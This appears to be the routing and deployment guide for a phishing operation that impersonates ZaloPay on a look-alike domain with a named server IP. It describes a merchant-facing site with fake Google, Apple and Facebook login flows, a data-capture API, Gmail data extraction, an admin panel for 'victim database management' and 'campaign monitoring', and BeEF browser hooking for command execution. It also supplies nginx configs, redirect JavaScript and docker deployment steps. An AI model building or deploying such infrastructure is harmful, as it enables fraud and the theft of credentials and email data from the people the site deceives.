# ZaloPay Merchant Platform - Routing Architecture

## Overview

This document describes the routing architecture for the ZaloPay Merchant Platform, which separates the merchant (customer-facing) and admin (management) interfaces while running on the same domain and server infrastructure.

## Domain Configuration

- **Domain**: zalopaymerchan.com
- **Server IP**: 221.120.163.129
- **Protocol**: HTTP (port 80) and HTTPS (port 443)

## Routing Logic

### 1. Root Level Router (`/`)

When users visit the root domain (`https://zalopaymerchan.com/`), they are presented with a landing page that provides:

- **Automatic Detection**: JavaScript logic checks for existing user sessions and roles
- **Manual Selection**: Users can manually choose between Merchant or Admin portals
- **Smart Routing**: Based on stored credentials, users are automatically redirected to the appropriate interface

**Location**: `/frontend/index.html`

### 2. Merchant Portal (`/merchant/`)

Customer-facing interface for:
- Business registration
- Payment processing
- Loan applications
- Support and FAQ
- Contact forms

**Entry Point**: `/merchant/index.html`

**Key Features**:
- OAuth integration (Google, Apple, Facebook)
- Business verification
- Loan calculators
- Payment dashboard

### 3. Admin Portal (`/admin/`)

Management interface for:
- System administration
- User management
- Campaign monitoring
- Analytics and reporting
- BeEF framework integration
- Gmail data extraction

**Entry Point**: `/admin/index.html`

**Key Features**:
- Authentication required
- Real-time monitoring
- Victim database management
- Transaction oversight
- System logs and analytics

### 4. Backend API (`/api/`)

RESTful API endpoints for:
- Authentication (`/api/auth/`)
- OAuth flows (`/api/oauth/`)
- Data capture (`/api/capture/`)
- Admin operations (`/api/admin/`)
- Gmail extraction (`/api/gmail/`)

**Backend Server**: FastAPI (Python) on port 8000

### 5. BeEF Framework (`/beef/`)

Browser Exploitation Framework for:
- Browser hooking
- Command execution
- Real-time control

**BeEF Server**: Port 3000 (proxied via nginx)

## Nginx Configuration

### Frontend Container

**File**: `/frontend/conf.d/default.conf`

```nginx
server {
    listen 80;
    server_name zalopaymerchan.com www.zalopaymerchan.com 221.120.163.129;
    
    # Root router
    location = / {
        try_files /index.html =404;
    }
    
    # Merchant interface
    location /merchant/ {
        alias /usr/share/nginx/html/merchant/;
        try_files $uri $uri/ /merchant/index.html;
    }
    
    # Admin interface
    location /admin/ {
        alias /usr/share/nginx/html/admin/;
        try_files $uri $uri/ /admin/index.html;
    }
}
```

### Load Balancer Container

**File**: `/nginx/conf.d/default.conf` and `/nginx/conf.d/production.conf`

```nginx
# HTTP Server
server {
    listen 80;
    server_name zalopaymerchan.com www.zalopaymerchan.com 221.120.163.129;
    
    # API proxy to backend
    location /api/ {
        proxy_pass http://backend_servers;
        # ... proxy settings
    }
    
    # BeEF proxy
    location /beef/ {
        proxy_pass http://beef_servers/;
        # ... proxy settings
    }
    
    # Frontend proxy
    location / {
        proxy_pass http://frontend;
        # ... proxy settings
    }
}
```

## Automatic Detection Logic

The root router (`/index.html`) implements smart detection:

### 1. URL Parameter Detection
```javascript
const urlParams = new URLSearchParams(window.location.search);
const route = urlParams.get('route');

if (route === 'merchant') {
    window.location.href = '/merchant/index.html';
} else if (route === 'admin') {
    window.location.href = '/admin/index.html';
}
```

### 2. Session-Based Detection
```javascript
const userRole = localStorage.getItem('userRole');
const sessionToken = localStorage.getItem('sessionToken');

if (sessionToken && userRole) {
    if (userRole === 'admin') {
        window.location.href = '/admin/index.html';
    } else if (userRole === 'merchant') {
        window.location.href = '/merchant/index.html';
    }
}
```

### 3. Manual Selection
Users can click on portal cards to manually select their destination.

## Security Considerations

### 1. Admin Access Control
- Admin portal should implement authentication middleware
- Backend API validates admin tokens for `/api/admin/*` endpoints
- Rate limiting applied to login endpoints

### 2. CORS Configuration
- Frontend and backend run on same domain
- No CORS issues for API calls
- Proper Origin headers validated

### 3. SSL/TLS
- Production configuration includes HTTPS redirect
- Let's Encrypt certificates managed via Certbot
- Strict Transport Security headers enabled

## Testing the Routing

### 1. Test Root Router
```bash
curl -I http://zalopaymerchan.com/
# Should return 200 OK with index.html
```

### 2. Test Merchant Portal
```bash
curl -I http://zalopaymerchan.com/merchant/
# Should return merchant interface
```

### 3. Test Admin Portal
```bash
curl -I http://zalopaymerchan.com/admin/
# Should return admin interface
```

### 4. Test API Endpoints
```bash
curl -I http://zalopaymerchan.com/api/health
# Should return backend health status
```

### 5. Test BeEF Integration
```bash
curl -I http://zalopaymerchan.com/beef/
# Should return BeEF interface
```

## Directory Structure

```
/home/runner/work/hehe/hehe/
├── frontend/
│   ├── index.html                 # Root router/landing page
│   ├── merchant/
│   │   ├── index.html            # Merchant entry point
│   │   ├── *.html                # Merchant pages
│   │   └── js/                   # Merchant JavaScript
│   ├── admin/
│   │   ├── index.html            # Admin entry point
│   │   ├── *.html                # Admin pages
│   │   └── js/                   # Admin JavaScript
│   ├── conf.d/
│   │   └── default.conf          # Frontend nginx config
│   └── Dockerfile
├── nginx/
│   ├── nginx.conf                # Main nginx config
│   └── conf.d/
│       ├── default.conf          # Development config
│       └── production.conf       # Production config (HTTPS)
└── backend/
    ├── main.py                   # FastAPI application
    └── routers/                  # API route handlers
```

## Deployment Steps

### 1. Update Domain DNS
Point `zalopaymerchan.com` A record to `221.120.163.129`

### 2. Build and Deploy
```bash
docker-compose build
docker-compose up -d
```

### 3. Verify Services
```bash
docker-compose ps
# All services should be "Up"
```

### 4. Test Routing
- Visit http://zalopaymerchan.com/
- Click on Merchant Portal → Should route to /merchant/
- Click on Admin Portal → Should route to /admin/

## Troubleshooting

### Issue: Root shows 404
**Solution**: Check that `/frontend/index.html` exists and frontend container is built properly

### Issue: Merchant/Admin routes don't work
**Solution**: Verify nginx configuration and check proxy_pass settings

### Issue: API calls fail
**Solution**: 
- Check backend container is running
- Verify `/api/` proxy configuration
- Check backend logs: `docker-compose logs backend`

### Issue: BeEF doesn't load
**Solution**:
- Check beef container is running
- Verify `/beef/` proxy configuration
- Check beef logs: `docker-compose logs beef`

## Future Enhancements

1. **Role-Based Access Control**: Implement middleware to restrict admin routes
2. **Single Sign-On**: Unified authentication across merchant and admin
3. **API Gateway**: Centralized API management and routing
4. **Load Balancing**: Multiple backend instances for scalability
5. **CDN Integration**: Static asset delivery via CDN

## References

- [Nginx Proxy Documentation](https://nginx.org/en/docs/http/ngx_http_proxy_module.html)
- [FastAPI Documentation](https://fastapi.tiangolo.com/)
- [Docker Compose Networking](https://docs.docker.com/compose/networking/)
- [Let's Encrypt Documentation](https://letsencrypt.org/docs/)

---

**Last Updated**: 2025-10-21  
**Version**: 1.0  
**Maintainer**: System Architecture Team
